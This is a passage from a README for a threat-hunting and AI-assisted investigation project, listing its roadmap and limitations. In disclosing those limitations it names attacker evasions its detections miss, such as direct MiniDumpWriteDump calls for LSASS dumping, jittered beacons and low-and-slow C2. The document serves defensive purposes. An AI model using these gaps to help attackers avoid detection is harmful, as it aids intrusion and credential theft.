`EnvironmentModel.platforms` is a *set*, computed by union rather than by picking one, so
an estate that really does have Windows endpoints, AWS accounts and a Kubernetes cluster
at once gets all five capabilities standing up simultaneously.

**This changes measured investigation quality, not just which classes get instantiated.**
[INC-005](#how-useful-is-this-actually) is detected and correctly correlated either way;
whether it gets *investigated* depends entirely on whether `ControlPlaneAgent` was in the
roster. Two separate proofs pin this: `tests/test_control_plane_agent.py` shows the
specialist adds real value in isolation (old roster: 0 facts; roster + the one new
specialist: real facts and the correct inference) with no registry involved, and
`tests/test_crew_assembly.py` shows assembly selects and excludes the right capabilities
for each environment — including the hybrid one — independently of whether an
investigation is ever run. Neither test could stand in for the other: a specialist that
works but never gets assembled helps no one, and a registry that assembles a specialist
which does nothing useful proves nothing either.

**What this still is not.** `CapabilitySpec` is a fixed, hand-written registry of five
capabilities — the system selects among capabilities that already exist, it does not
design or propose a new one for a telemetry shape nobody anticipated. A capability
registry with versioning, evaluation gates for newly proposed capabilities, and
per-capability token/tool budgets — the parts of the original vision this milestone does
not reach — is the gap between this and the adaptive platform described in the opening
sections of this README.

---

## Roadmap

| # | Milestone | Status |
| - | --------- | ------ |
| 1 | Telemetry schema, generator, loader, CLI, tests | ✅ done |
| 2 | 10 detection rules in pandas + KQL equivalents, `Finding` model, hunt engine | ✅ done |
| 3 | ATT&CK mapping, detector evaluation, attack-chain correlation | ✅ done |
| 4 | Autonomous investigation agent (specialists, claims, verifier, optional LLM) | ✅ done |
| 5 | Investigation report generation with calibrated language | ✅ done |
| 6 | Detection-engineering loop: propose, evaluate, iterate, promote | ✅ done |
| 7 | Pluggable `TelemetrySource`: real Microsoft Defender export ingestion | ✅ done |
| 8 | Environment model, telemetry-visibility measurement, 4-state ATT&CK coverage | ✅ done |
| 9 | Capability-based specialist eligibility; CloudTrail source; incident benchmark | ✅ done |
| 10 | Benign-evidence triage: prevalence baselines, gated signals, malicious veto | ✅ done |
| 11 | Singleton cases, process identity (hash/signer/path), multi-window prevalence, analyst feedback | ✅ done |
| 12 | ATT&CK catalogue migrated to v19.2; shared `ath.behavior` layer closes a beacon-triage false negative; `ATH-011`/`ATH-012` (recovery inhibition, security-tool tampering) | ✅ done |
| 13 | Adaptive crew assembly: `ath.schema.EVENT_CONTROL`, CloudTrail management-API + Kubernetes audit ingestion, `AWS-001/002`/`K8S-001/002`, `ControlPlaneAgent`, environment-driven `assemble_crew` | ✅ done |

---

## Limitations

Stated up front, because overclaiming is the fastest way to fail a technical interview:

- **The demo dataset is synthetic; real ingestion exists but is only lightly exercised.**
  `DefenderExportSource` is tested against a hand-built fixture with a verified real
  schema, not against an actual production Defender tenant's export, which will contain
  edge cases (locale differences, additional ActionType values, partial exports) this
  project has not seen.
- **The Defender adapter maps a deliberately small field set.** It carries over the
  columns this project's canonical schema uses and drops the rest (hashes, signer
  info, session ids, version metadata). A real investigation would often want those
  too; extending the schema to carry them is a straightforward but real next step.
- **`LogonType` translation covers exactly the five values Microsoft documents today.**
  A future product change adding a sixth value would be dropped as an unrecognised-value
  issue, not silently miscoded -- but it would still need a code change to translate.
- **These detections are not production-ready.** They are illustrative hunting logic
  with documented assumptions, not tuned rules validated against an organisation's
  baseline.
- **ATT&CK mappings are evidence-informed interpretations, not verdicts.** They say the
  observed behaviour matches how ATT&CK describes a technique. They do not establish
  that an adversary was present.
- **The agent's specialists are hand-written, not autonomous discovery.** They know
  which rule ids to look for; a genuinely open-ended agent would need to infer relevance
  from evidence content, not from a rule-id allowlist.
- **Beacon detection uses a simple robust statistic (median/MAD) on fixed intervals.**
  Real implants add jitter specifically to defeat this; a negative result is weak
  evidence of absence, and the code says so.
- **The orchestrator has no persistence or checkpointing.** Each `investigate` run starts
  fresh; there is no resuming a partially completed investigation across process
  restarts (LangGraph's checkpointing could add this, but it is not wired up).
- **Recommended actions are pattern-matched against specialist phrasing.** They key off
  literal substrings in hypothesis statements (e.g. "obtained from memory"). This is
  transparent and testable but brittle to unrelated wording changes in the specialists --
  a coupling documented in `src/ath/reporting/builder.py`, not hidden.
- **Only Markdown and JSON output exist.** No PDF or HTML rendering yet; the Markdown is
  designed to be readable as plain text and to render cleanly wherever Markdown is
  supported.
- **The detection-engineering loop targets two hand-identified gaps, not open-ended
  discovery.** `ath.engineering` proposes candidates for Initial Access and Discovery
  specifically because this project already knew those stages were uncovered; it does
  not yet scan a case's full time window for arbitrary unflagged patterns and propose
  rules generically. It also does not auto-promote -- a v2 candidate scoring well is a
  recommendation, not a commit.
- **v1's measured false-positive rate is specific to this dataset's benign templates.**
  A different environment's baseline noise would produce different numbers; the loop
  demonstrates the propose/measure/iterate *method*, not a universal precision figure.
- **Correlation confidence measures the grouping, not the maliciousness.** A `high`
  confidence case means the findings are strongly linked to each other, not that an
  intrusion is confirmed.
- **Single-day, single-tenant scope.** No long-baseline behavioural modelling. ATH-006
  infers host ownership from a four-hour window; real self-baselining needs weeks of
  history plus explicit exclusions for jump boxes and admin workstations.
- **ATH-004 reads command lines only.** Real LSASS dumping is better caught by observing
  a process open a handle to `lsass.exe` with memory-read rights. An implant calling
  `MiniDumpWriteDump()` directly produces no suspicious command line and would be missed.
  The handle-based query is included in `queries/ATH-004-*.kql` as documentation of the
  gap, and `python main.py visibility` now reports it as `T1003.001-handle`
  (unobservable, needs `handle_access`) rather than leaving it as prose.
- **The Environment Model describes, it does not yet plan.** It establishes what the
  environment is and what can be seen of it, and specialists now consult it — but
  nothing yet *plans* from it. The roster is still a fixed set of four; the system
  selects among them by capability rather than assembling a crew appropriate to the
  environment, and it cannot propose a capability it does not already have. A cloud
  environment would correctly activate the identity and endpoint specialists on its
  CloudTrail evidence, and would correctly report that no cloud-specific capability
  exists — but it would not create one. That is the next milestone, and it needs the
  capability registry and evaluation harness the vision describes.
- **The canonical schema is Windows-shaped, and CloudTrail proved exactly where.**
  `ath.telemetry.cloudtrail_source` maps AWS authentication events cleanly — and
  **refuses** to map management API calls (`CreateAccessKey`, `AttachUserPolicy`,
  `StopLogging`), because `process_name = "CreateAccessKey"` would make the visibility
  model report `process_execution` as *available* for an environment with no endpoint
  telemetry at all. Those records are reported as unmapped rather than coerced. So
  roughly a third of a real CloudTrail export currently has nowhere to go, and closing
  that needs a schema change, not another adapter.
- **`logon_type` has no cloud equivalent, and that has consequences.** It is left null
  rather than invented, which correctly stops `ATH-006`'s host-ownership inference from
  firing on telemetry where interactive host sessions do not exist — but it also means
  the environment model cannot classify cloud identities as interactive or service.
- **Correlation needs two linked findings, so single-finding incidents get no
  investigation.** Measured, not theorised: INC-002 in the benchmark detects a cloud
  credential-stuffing attack and then produces zero facts, because one finding cannot
  form a case. This is the largest gap the benchmark currently exposes.
- **The benchmark is three incidents, two of them derived from one dataset.** It is
  enough to have caught real defects, and far from a representative corpus. The quiet-day
  scenario in particular measures false alarms against *this* benign background only.
- **Benign triage rests on prevalence, and prevalence needs a real baseline.** The
  destination and process profiles are computed from a four-hour window of eight hosts.
  In a real estate they would need weeks of history and explicit handling for newly
  onboarded software, which starts rare and looks suspicious for exactly that reason.
- **Benign signals are hand-written gates, like the ATT&CK mappings.** They cover the
  metadata this project's ten rules happen to emit. A new rule emitting different
  metadata gets `needs_review` by default — safe, but it means coverage of the benign
  side grows manually rather than automatically.
- **`is_known_security_tool` reads a hardcoded product list.** `CcmExec.exe` is
  recognised as Configuration Manager because it is in a dictionary in
  `ath/environment/model.py`. That list is short and Windows-only. It now also requires
  a consistent valid signature, so a rename no longer inherits a reputation — but an
  unlisted product gets no credit however legitimate it is.
- **Synthetic signatures are derived, not real.** `ath.telemetry.identity` decides
  signer and status from image name plus install path. That is a faithful *model* of
  Authenticode for testing the logic above it, and it is not certificate validation. A
  real deployment needs actual signature data; the Defender adapter correctly reports
  `unknown` rather than inventing it.
- **Low-and-slow C2 through trusted infrastructure is still cleared.** Four connections
  to a widely-used destination over TLS stays under the sustained-contact threshold.
  Closing it needs inter-arrival regularity, which lives in the investigation layer's
  `analyse_beacon` and is not available at triage time. Asserted explicitly in
  `test_attack_low_and_slow_through_a_popular_destination`.
- **Multi-window prevalence still has only one short window to work with.** The recent
  slice is the final quarter of whatever observation exists — four hours here. It
  distinguishes *emerging* from *established* in principle, and every figure carries a
  note saying the window is far too short to establish what is normal.
- **Analyst feedback is measurement only.** Verdicts are recorded and scored; nothing
  feeds back into detection automatically, by design. Acting on the disagreement report
  is a human decision, so the loop closes at human speed.
- **Singleton cases are gated on severity alone.** A lone MEDIUM finding is still
  dropped rather than investigated. That keeps the triage-reduction metric meaningful,
  but it means a genuine incident that only ever trips one medium-severity rule is
  detected and never explained.
- **Host-role inference cannot see a jump box.** A machine with both interactive logons
  and inbound remote authentication is classified as a workstation with the ambiguity
  stated in its `role_reason`, because this telemetry genuinely cannot distinguish a
  developer's desktop from a terminal server.
- **The technique watchlist is hand-curated, not the full ATT&CK matrix.** It covers 25
  techniques chosen to exercise all four coverage states. A production posture
  assessment would need the full matrix and per-technique telemetry requirements
  maintained as data, not as a Python tuple.
